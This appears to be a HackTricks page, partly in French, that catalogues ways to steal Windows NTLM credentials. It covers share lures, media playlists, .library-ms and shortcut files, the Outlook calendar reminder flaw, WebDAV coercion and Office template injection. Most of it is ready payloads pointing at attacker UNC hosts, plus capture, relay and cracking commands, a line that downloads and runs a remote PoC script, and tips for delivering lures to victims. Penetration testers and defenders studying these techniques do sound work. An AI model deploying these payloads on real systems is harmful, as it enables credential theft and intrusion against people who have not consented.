# Places to steal NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Consultez toutes les excellentes idées de [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) depuis le téléchargement d’un fichier Microsoft Word en ligne jusqu’aux sources de leaks NTLM : https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md et [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

If you can **write to a share that users or scheduled jobs browse in Explorer**, drop files whose metadata points to your UNC (e.g. `\\ATTACKER\share`). Rendering the folder triggers **implicit SMB authentication** and leaks a **NetNTLMv2** to your listener.

1. **Generate lures** (covers SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Les déposer sur le share inscriptible** (n’importe quel dossier que la victime ouvre) :
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Écouter et crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows peut atteindre plusieurs fichiers à la fois ; tout ce qu’Explorer prévisualise (`BROWSE TO FOLDER`) ne nécessite aucun clic.

### Playlists Windows Media Player (.ASX/.WAX)

Si vous pouvez amener une cible à ouvrir ou prévisualiser une playlist Windows Media Player que vous contrôlez, vous pouvez leak Net‑NTLMv2 en pointant l’entrée vers un chemin UNC. WMP tentera de récupérer le média référencé via SMB et s’authentifiera implicitement.

Exemple de payload :
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Flux de collecte et de cracking :
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer gère de manière insecure les fichiers .library-ms lorsqu’ils sont ouverts directement depuis une archive ZIP. Si la définition de la bibliothèque pointe vers un chemin UNC distant (par ex., \\attacker\share), le simple fait de parcourir/lancer le fichier .library-ms à l’intérieur du ZIP provoque Explorer à énumérer le UNC et à émettre une authentification NTLM vers l’attaquant. Cela fournit un NetNTLMv2 qui peut être cracké offline ou potentiellement relayé.

Minimal .library-ms pointant vers un UNC d’attaquant
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Étapes opérationnelles
- Créez le fichier .library-ms avec le XML ci-dessus (définissez votre IP/hostname).
- Zippez-le (sur Windows : Envoyer vers → Dossier compressé (zippé)) et livrez le ZIP à la cible.
- Exécutez un listener de capture NTLM et attendez que la victime ouvre le fichier .library-ms depuis l’intérieur du ZIP.


### Chemin du son de rappel de calendrier Outlook (CVE-2023-23397) – fuite Net‑NTLMv2 zero‑click

Microsoft Outlook for Windows traitait la propriété MAPI étendue PidLidReminderFileParameter dans les éléments de calendrier. Si cette propriété pointe vers un chemin UNC (par ex., \\attacker\share\alert.wav), Outlook contacterait le partage SMB lorsque le rappel se déclenche, fuyant le Net‑NTLMv2 de l’utilisateur sans aucun clic. Ce correctif a été appliqué le 14 mars 2023, mais il reste très pertinent pour les parcs legacy/non touchés et pour la réponse à incident historique.

Exploitation rapide avec PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Côté listener :
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notes
- Une victime n’a besoin que d’Outlook for Windows en cours d’exécution lorsque le rappel se déclenche.
- Le leak fournit du Net‑NTLMv2 adapté au crack offline ou au relay (pas au pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer rend automatiquement les icônes des raccourcis. Des recherches récentes ont montré que même après le patch d’avril 2025 de Microsoft pour les raccourcis d’icônes UNC, il était toujours possible de déclencher une authentification NTLM sans clic en hébergeant la cible du raccourci sur un chemin UNC et en gardant l’icône locale (bypass du patch attribué à CVE‑2025‑50154). Le simple fait d’ouvrir le dossier amène Explorer à récupérer des métadonnées depuis la cible distante, envoyant du NTLM vers le serveur SMB de l’attaquant.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload de raccourci de programme (.lnk) via PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Idées de livraison
- Placez le raccourci dans un ZIP et faites en sorte que la victime le parcoure.
- Placez le raccourci sur un partage en écriture que la victime ouvrira.
- Combinez-le avec d’autres fichiers leurres dans le même dossier afin que l’Explorateur affiche un aperçu des éléments.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows charge les métadonnées `.lnk` pendant la **view/preview** (rendu d’icône), et pas seulement à l’exécution. CVE‑2026‑25185 montre un chemin d’analyse où des blocs **ExtraData** font que le shell résout un chemin d’icône et touche le système de fichiers **during load**, émettant du NTLM sortant lorsque le chemin est distant.

Conditions de déclenchement clés (observées dans `CShellLink::_LoadFromStream`) :
- Inclure **DARWIN_PROPS** (`0xa0000006`) dans ExtraData (porte d’entrée vers la routine de mise à jour de l’icône).
- Inclure **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) avec **TargetUnicode** renseigné.
- Le chargeur développe les variables d’environnement dans **TargetUnicode** et appelle `PathFileExistsW` sur le chemin résultant.

Si `TargetUnicode` se résout vers un chemin UNC (par ex. `\\attacker\share\icon.ico`), le simple fait de **viewing a folder** contenant le raccourci provoque une authentification sortante. Le même chemin de chargement peut aussi être atteint par **indexing** et **AV scanning**, ce qui en fait une surface de leak no-click pratique.

Des outils de recherche (parser/generator/UI) sont disponibles dans le projet **LnkMeMaybe** pour construire/inspecter ces structures sans utiliser l’interface Windows.


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

Le client **WebDAV** natif peut être abusé pour forcer la session de connexion actuelle à s’authentifier auprès d’un endpoint **HTTP/WebDAV** arbitraire :
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Pourquoi c’est utile :
- Contre un **attacker-controlled WebDAV server**, cela peut déclencher **NTLM over HTTP** sans déposer de custom client.
- Contre des **internal hosts**, c’est une manière discrète de **valider où des credentials volés sont acceptés** avant de se déplacer latéralement.
- La commande est une bonne alternative lorsque **SMB egress est filtré** mais **HTTP/WebDAV** reste accessible.

Operational notes :
- Le service **WebClient** doit être en cours d’exécution sur l’hôte source.
- `rundll32.exe` charge `davclnt.dll` et fait en sorte que Windows gère l’authentification WebDAV en utilisant les **current user's credentials**.
- Si vous le pointez vers une infrastructure que vous contrôlez, utilisez un écouteur/relay HTTP compatible NTLM tel que :
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
From a detection perspective, repeated `rundll32.exe davclnt.dll,DavSetCookie` executions against many internal systems are a strong signal of **credential validation / spray-like lateral movement prep** rather than normal user behaviour.

### Office remote template injection (.docx/.dotm) to coerce NTLM

Les documents Office peuvent référencer un modèle externe. Si vous définissez le modèle joint sur un chemin UNC, l’ouverture du document s’authentifiera via SMB.

Minimal DOCX relationship changes (inside word/):

1) Edit word/settings.xml and add the attached template reference:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Modifiez word/_rels/settings.xml.rels et pointez rId1337 vers votre UNC :
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Repack vers .docx et livrer. Lancez votre SMB capture listener et attendez l’ouverture.

Pour des idées post-capture sur le relay ou l’abus de NTLM, consultez :

{{#ref}}
README.md
{{#endref}}


## References
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
